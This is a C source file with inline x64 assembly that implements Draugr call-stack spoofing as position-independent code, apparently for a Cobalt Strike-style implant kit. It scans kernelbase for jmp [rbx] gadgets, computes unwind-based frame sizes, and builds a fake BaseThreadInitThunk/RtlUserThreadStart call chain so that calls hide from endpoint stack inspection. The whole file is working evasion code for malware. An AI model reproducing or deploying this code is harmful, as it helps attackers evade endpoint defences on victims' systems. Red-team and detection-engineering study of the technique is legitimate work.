/*
 * Draugr call-stack spoofing — PIC port for p3-crystal.
 *
 * Based on:
 *   https://github.com/NtDallas/Draugr
 *   https://github.com/rasta-mouse/Crystal-Kit
 */

#include <windows.h>
#include "draugr.h"

/* ── Minimal stdlib ─────────────────────────────────────────────────── */
static void *_memset(void *ptr, int byte, size_t size)
{
    char *p = (char *)ptr;
    for (size_t i = 0; i < size; i++)
        p[i] = (char)byte;
    return ptr;
}

static int _strcmp(const char *s1, const char *s2)
{
    for (; *s1 == *s2; s1++, s2++)
        if (*s1 == '\0')
            return 0;
    return (*(const unsigned char *)s1 < *(const unsigned char *)s2) ? -1 : 1;
}

/* ── RtlLookupFunctionEntry / RtlRandomEx typedefs ─────────────────── */
typedef PRUNTIME_FUNCTION(NTAPI *RtlLookupFunctionEntryPtr)(
    DWORD64 ControlPc, PDWORD64 ImageBase, PUNWIND_HISTORY_TABLE HistoryTable);
typedef ULONG(NTAPI *RtlRandomExPtr)(PULONG seed);

/* ── GetTextSectionSize ─────────────────────────────────────────────── */
static BOOL GetTextSectionSize(PVOID pModule,
                               PDWORD pdwVirtualAddress, PDWORD pdwSize)
{
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModule;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    PIMAGE_NT_HEADERS pNt =
        (PIMAGE_NT_HEADERS)((UINT_PTR)pModule + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    char text[] = {'.', 't', 'e', 'x', 't', 0};
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++)
    {
        if (_strcmp((char *)pSec[i].Name, text) == 0)
        {
            *pdwVirtualAddress = pSec[i].VirtualAddress;
            *pdwSize = pSec[i].SizeOfRawData;
            return TRUE;
        }
    }
    return FALSE;
}

/* ── FindGadget ─────────────────────────────────────────────────────── */
static PVOID FindGadget(IMPORTFUNCS *funcs, PVOID pModuleAddr)
{
    DWORD dwVa = 0, dwSize = 0;
    PVOID gadgets[maxNumberOfGadgets];
    DWORD count = 0;
    ULONG seed = 0x1337;

    RtlRandomExPtr RtlRandomEx =
        (RtlRandomExPtr)funcs->GetProcAddress(
            funcs->GetModuleHandleA("ntdll"), "RtlRandomEx");

    if (!GetTextSectionSize(pModuleAddr, &dwVa, &dwSize))
        return NULL;

    PBYTE text = (PBYTE)((UINT_PTR)pModuleAddr + dwVa);
    for (DWORD i = 0; i < dwSize - 1; i++)
    {
        if (text[i] == 0xFF && text[i + 1] == 0x23)
        {
            gadgets[count++] = (PVOID)(text + i);
            if (count == maxNumberOfGadgets)
                break;
        }
    }
    if (!count)
        return NULL;

    ULONG rnd = RtlRandomEx(&seed) % count;
    return gadgets[rnd];
}

/* ── CalculateFunctionStackSize ─────────────────────────────────────── */
static void *CalculateFunctionStackSize(PRUNTIME_FUNCTION pRf,
                                        const DWORD64 imageBase)
{
    STACK_FRAME sf;
    _memset(&sf, 0, sizeof(sf));

    if (!pRf)
        return NULL;

    PUNWIND_INFO_T pUi =
        (PUNWIND_INFO_T)(pRf->UnwindData + imageBase);
    ULONG index = 0;

    while (index < pUi->CountOfCodes)
    {
        ULONG op = pUi->UnwindCode[index].UnwindOp;
        ULONG info = pUi->UnwindCode[index].OpInfo;

        if (op == UWOP_PUSH_NONVOL)
        {
            sf.TotalStackSize += 8;
            if (info == RBP_OP_INFO)
            {
                sf.PushRbp = TRUE;
                sf.CountOfCodes = pUi->CountOfCodes;
                sf.PushRbpIndex = index + 1;
            }
        }
        else if (op == UWOP_SAVE_NONVOL)
        {
            index += 1;
        }
        else if (op == UWOP_ALLOC_SMALL)
        {
            sf.TotalStackSize += (ULONGLONG)(info * 8 + 8);
        }
        else if (op == UWOP_ALLOC_LARGE)
        {
            index += 1;
            ULONG frameOffset = pUi->UnwindCode[index].FrameOffset;
            if (info == 0)
            {
                frameOffset *= 8;
            }
            else
            {
                index += 1;
                frameOffset += (ULONG)(pUi->UnwindCode[index].FrameOffset << 16);
            }
            sf.TotalStackSize += frameOffset;
        }
        else if (op == UWOP_SET_FPREG)
        {
            sf.SetsFramePointer = TRUE;
        }
        else if (op == UWOP_SAVE_XMM128)
        {
            return NULL;
        }
        index += 1;
    }

    if (pUi->Flags & UNW_FLAG_CHAININFO)
    {
        index = pUi->CountOfCodes;
        if (index & 1)
            index += 1;
        pRf = (PRUNTIME_FUNCTION)(&pUi->UnwindCode[index]);
        return CalculateFunctionStackSize(pRf, imageBase);
    }

    sf.TotalStackSize += 8;
    return (void *)(ULONG_PTR)sf.TotalStackSize;
}

/* ── CalculateFunctionStackSizeWrapper ──────────────────────────────── */
static void *CalculateFunctionStackSizeWrapper(IMPORTFUNCS *funcs,
                                               PVOID returnAddress)
{
    RtlLookupFunctionEntryPtr RtlLookupFunctionEntry =
        (RtlLookupFunctionEntryPtr)funcs->GetProcAddress(
            funcs->GetModuleHandleA("ntdll"), "RtlLookupFunctionEntry");

    if (!returnAddress || !RtlLookupFunctionEntry)
        return NULL;

    DWORD64 imageBase = 0;
    PRUNTIME_FUNCTION pRf =
        RtlLookupFunctionEntry((DWORD64)returnAddress, &imageBase, NULL);
    if (!pRf)
        return NULL;

    return CalculateFunctionStackSize(pRf, imageBase);
}

/* ── InitFrameInfo ──────────────────────────────────────────────────── */
BOOL InitFrameInfo(IMPORTFUNCS *funcs, PSYNTHETIC_STACK_FRAME stackFrame)
{
    HMODULE hK32 = funcs->GetModuleHandleA("Kernel32.dll");
    HMODULE hNtdll = funcs->GetModuleHandleA("Ntdll.dll");
    HMODULE hKBase = funcs->GetModuleHandleA("Kernelbase.dll");

    if (!hK32 || !hNtdll || !hKBase)
        return FALSE;

    stackFrame->Frame1.ModuleAddress = (PVOID)hK32;
    stackFrame->Frame1.FunctionAddress =
        (PVOID)funcs->GetProcAddress(hK32, "BaseThreadInitThunk");
    stackFrame->Frame1.Offset = 0x14;

    stackFrame->Frame2.ModuleAddress = (PVOID)hNtdll;
    stackFrame->Frame2.FunctionAddress =
        (PVOID)funcs->GetProcAddress(hNtdll, "RtlUserThreadStart");
    stackFrame->Frame2.Offset = 0x21;

    if (!stackFrame->Frame1.FunctionAddress ||
        !stackFrame->Frame2.FunctionAddress)
        return FALSE;

    stackFrame->pGadget = (PVOID)hKBase;
    return TRUE;
}

/* ── DraugrSpoofStub (naked asm) ────────────────────────────────────── */
/*
 * Ported from Sleepmask-VS, adapted for MinGW / -masm=intel.
 * Full annotation: https://github.com/Cobalt-Strike/sleepmask-vs
 *
 * Signature:
 *   DraugrSpoofStub(pArg1..4, draugrParams*, funcAddr, size=8, pArg5..12)
 *
 * On entry (Windows x64):
 *   rcx=pArg1  rdx=pArg2  r8=pArg3  r9=pArg4
 *   [rsp+0x28]=draugrParams  [rsp+0x30]=funcAddr  [rsp+0x38]=8
 *   [rsp+0x40..0x88]=pArg5..pArg12
 */
__attribute__((naked)) void *DraugrSpoofStub(PVOID pArg1, PVOID pArg2, PVOID pArg3, PVOID pArg4,
                                             PVOID draugrParameters, PVOID pFunctionAddr, int size,
                                             PVOID pArg5, PVOID pArg6, PVOID pArg7, PVOID pArg8,
                                             PVOID pArg9, PVOID pArg10, PVOID pArg11, PVOID pArg12)
{
    asm(
        /* pop real return addr (so rax holds it and rsp is at shadow space) */
        "pop rax \n"

        /* save non-volatiles we'll clobber */
        "mov r10, rdi \n"
        "mov r11, rsi \n"

        /* after the pop, [rsp+0x20]=draugrParams, [rsp+0x28]=funcAddr */
        "mov rdi, [rsp + 0x20] \n" /* rdi = &draugrParameters */
        "mov rsi, [rsp + 0x28] \n" /* rsi = pFunctionAddr     */

        /* save non-volatiles into draugrParameters struct */
        "mov [rdi + 24],  r10 \n" /* ->Rdi                   */
        "mov [rdi + 88],  r11 \n" /* ->Rsi                   */
        "mov [rdi + 96],  r12 \n" /* ->R12                   */
        "mov [rdi + 104], r13 \n" /* ->R13                   */
        "mov [rdi + 112], r14 \n" /* ->R14                   */
        "mov [rdi + 120], r15 \n" /* ->R15                   */

        /* r12 = return addr (restored at fixup) */
        "mov r12, rax \n"

        /* r13 = size (number of extra stack args to relocate) */
        "xor r11, r11 \n"
        "mov r13, [rsp + 0x30] \n" /* r13 = size = 8          */

        /* r14 = total stack displacement we'll allocate:
         *   0x200 (scratch) + 8 (ret-addr slot)
         *   + RtlUserThreadStartStackSize
         *   + TrampolineStackSize
         *   + BaseThreadInitThunkStackSize
         *   - 0x20 (shadow already on stack) */
        "mov r14, 0x200 \n"
        "add r14, 8 \n"
        "add r14, [rdi + 56] \n" /* RtlUserThreadStartStackSize    */
        "add r14, [rdi + 48] \n" /* TrampolineStackSize            */
        "add r14, [rdi + 32] \n" /* BaseThreadInitThunkStackSize   */
        "sub r14, 0x20 \n"

        /* r10 = pointer to first extra stack arg (pArg5) */
        "mov r10, rsp \n"
        "add r10, 0x30 \n"

        /* relocate extra stack args into their final stack positions */
        "looping: \n"
        "xor r15, r15 \n"
        "cmp r11d, r13d \n"
        "je finish \n"
        "sub r14, 8 \n"
        "mov r15, rsp \n"
        "sub r15, r14 \n"
        "add r10, 8 \n"
        "push qword ptr [r10] \n"
        "pop  qword ptr [r15] \n"
        "add r11, 1 \n"
        "jmp looping \n"

        "finish: \n"
        /* allocate 0x200 scratch region (where target function runs) */
        "sub rsp, 0x200 \n"

        /* build synthetic call chain: NULL → RUTS → BTIT → trampoline */
        "push 0 \n"
        "sub rsp, [rdi + 56] \n" /* RtlUserThreadStart frame     */
        "mov r11, [rdi + 64] \n" /* ->RtlUserThreadStartReturnAddress */
        "mov [rsp], r11 \n"
        "sub rsp, [rdi + 32] \n" /* BaseThreadInitThunk frame    */
        "mov r11, [rdi + 40] \n" /* ->BaseThreadInitThunkReturnAddress */
        "mov [rsp], r11 \n"
        "sub rsp, [rdi + 48] \n" /* Trampoline frame             */
        "mov r11, [rdi + 80] \n" /* ->Trampoline gadget addr     */
        "mov [rsp], r11 \n"

        /* save original rbx; store return addr; set rbx = &Fixup;
         * fixup is reached via gadget: jmp [rbx] → [&draugrParams->Fixup] */
        "mov r11, rsi \n"           /* r11 = pFunctionAddr          */
        "mov [rdi + 8],  r12 \n"    /* ->OriginalReturnAddress = ret addr */
        "mov [rdi + 16], rbx \n"    /* ->Rbx = saved rbx            */
        "lea rbx, [rip + fixup] \n" /* rbx = runtime addr of fixup  */
        "mov [rdi + 0],  rbx \n"    /* ->Fixup = &fixup             */
        "mov rbx, rdi \n"           /* rbx = &draugrParameters      */
        "mov r10, rcx \n"           /* r10 = rcx = pArg1 (pass through) */
        "mov rax, [rdi + 72] \n"    /* rax = Ssn (syscall number, unused here) */

        /* jump to target function */
        "jmp r11 \n"

        /* fixup — entered via: gadget (jmp [rbx]) where [rbx] = this addr */
        "fixup: \n"
        "mov rcx, rbx \n" /* rcx = &draugrParameters      */
        "add rsp, 0x200 \n"
        "add rsp, [rbx + 48] \n"  /* TrampolineStackSize          */
        "add rsp, [rbx + 32] \n"  /* BaseThreadInitThunkStackSize */
        "add rsp, [rbx + 56] \n"  /* RtlUserThreadStartStackSize  */
        "mov rbx, [rcx + 16] \n"  /* restore rbx                  */
        "mov rdi, [rcx + 24] \n"  /* restore rdi                  */
        "mov rsi, [rcx + 88] \n"  /* restore rsi                  */
        "mov r12, [rcx + 96] \n"  /* restore r12                  */
        "mov r13, [rcx + 104] \n" /* restore r13                  */
        "mov r14, [rcx + 112] \n" /* restore r14                  */
        "mov r15, [rcx + 120] \n" /* restore r15                  */
        "push rax \n"
        "xor rax, rax \n"
        "pop rax \n"
        "jmp qword ptr [rcx + 8] \n" /* jump to OriginalReturnAddress */
    );
}

/* ── SpoofCall ──────────────────────────────────────────────────────── */
PVOID SpoofCall(IMPORTFUNCS *funcs, PSYNTHETIC_STACK_FRAME stackFrame,
                PVOID pFunctionAddr,
                PVOID pArg1, PVOID pArg2, PVOID pArg3, PVOID pArg4,
                PVOID pArg5, PVOID pArg6, PVOID pArg7, PVOID pArg8,
                PVOID pArg9, PVOID pArg10, PVOID pArg11, PVOID pArg12)
{
    DRAUGR_PARAMETERS dp;
    _memset(&dp, 0, sizeof(dp));
    int attempts = 0;

    /* BaseThreadInitThunk frame */
    PVOID retAddr = (PVOID)((UINT_PTR)stackFrame->Frame1.FunctionAddress + stackFrame->Frame1.Offset);
    dp.BaseThreadInitThunkStackSize = CalculateFunctionStackSizeWrapper(funcs, retAddr);
    dp.BaseThreadInitThunkReturnAddress = retAddr;
    if (!dp.BaseThreadInitThunkStackSize || !dp.BaseThreadInitThunkReturnAddress)
        return NULL;

    /* RtlUserThreadStart frame */
    retAddr = (PVOID)((UINT_PTR)stackFrame->Frame2.FunctionAddress + stackFrame->Frame2.Offset);
    dp.RtlUserThreadStartStackSize = CalculateFunctionStackSizeWrapper(funcs, retAddr);
    dp.RtlUserThreadStartReturnAddress = retAddr;
    if (!dp.RtlUserThreadStartStackSize || !dp.RtlUserThreadStartReturnAddress)
        return NULL;

    /* Trampoline — retry until we find a gadget whose frame is >= 0x80 */
    do
    {
        dp.Trampoline = FindGadget(funcs, stackFrame->pGadget);
        dp.TrampolineStackSize = CalculateFunctionStackSizeWrapper(funcs, dp.Trampoline);
        if (++attempts > maxNumberOfTries)
            return NULL;
    } while (!dp.TrampolineStackSize ||
             ((__int64)dp.TrampolineStackSize < 0x80));

    if (!dp.Trampoline || !dp.TrampolineStackSize)
        return NULL;

    return DraugrSpoofStub(
        pArg1, pArg2, pArg3, pArg4,
        &dp, pFunctionAddr, 8,
        pArg5, pArg6, pArg7, pArg8,
        pArg9, pArg10, pArg11, pArg12);
}
